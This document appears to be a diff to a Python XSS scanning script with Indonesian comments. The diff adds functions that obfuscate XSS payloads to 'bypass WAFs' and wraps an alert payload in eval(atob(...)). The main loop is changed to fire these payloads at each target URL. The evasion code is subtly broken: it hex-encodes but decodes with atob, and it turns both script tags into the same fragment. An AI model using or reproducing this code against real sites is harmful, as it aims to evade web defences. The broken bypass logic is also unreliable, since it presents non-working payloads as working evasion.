@@ -2,10 +2,11 @@ import argparse
 import requests
 from urllib.parse import urlparse, urlencode, parse_qs
 from colorama import Fore, init
+import random
+import string
 
 # Inisialisasi colorama untuk mendukung pewarnaan teks di terminal
 init(autoreset=True)
-
 
 def send_request(url, headers=None):
     """
@@ -18,6 +19,22 @@ def send_request(url, headers=None):
         print(f"[ERROR] Request failed: {e}")
         return None
 
+def generate_obfuscated_payload(payload):
+    """
+    Obfuscate the XSS payload to bypass WAFs.
+    """
+    # Contoh obfuscation: mengganti <script> menjadi kode JavaScript yang berbeda
+    obfuscated_payload = payload.replace("<script>", "/*<*/script/*>*/").replace("</script>", "/*<*/script/*>*/")
+    return obfuscated_payload
+
+def generate_random_payload():
+    """
+    Generate a random payload using base64 encoding or hex encoding.
+    """
+    # Generate a random payload by encoding a simple XSS attack
+    basic_payload = "<script>alert('XSS');</script>"
+    payload_base64 = basic_payload.encode('utf-8').hex()
+    return f"eval(atob('{payload_base64}'))"
 
 def test_xss(url, xss_payloads, output_file=None):
     """
@@ -61,7 +78,6 @@ def test_xss(url, xss_payloads, output_file=None):
             file.write("\n".join(results) + "\n")
         print(f"\n[INFO] Results saved to: {output_file}")
 
-
 def load_payloads(file_path):
     """
     Memuat payload XSS dari file.
@@ -72,7 +88,6 @@ def load_payloads(file_path):
     except FileNotFoundError:
         print("[ERROR] Payload file not found! Exiting.")
         return []
-
 
 def main():
     print(r"""
@@ -124,8 +139,9 @@ def main():
 
     # Uji setiap URL
     for url in urls:
-        test_xss(url, payloads, output_file=args.output)
-
+        # Implement bypass techniques
+        bypassed_payloads = [generate_obfuscated_payload(p) for p in payloads] + [generate_random_payload()]
+        test_xss(url, bypassed_payloads, output_file=args.output)
 
 if __name__ == "__main__":
     main()
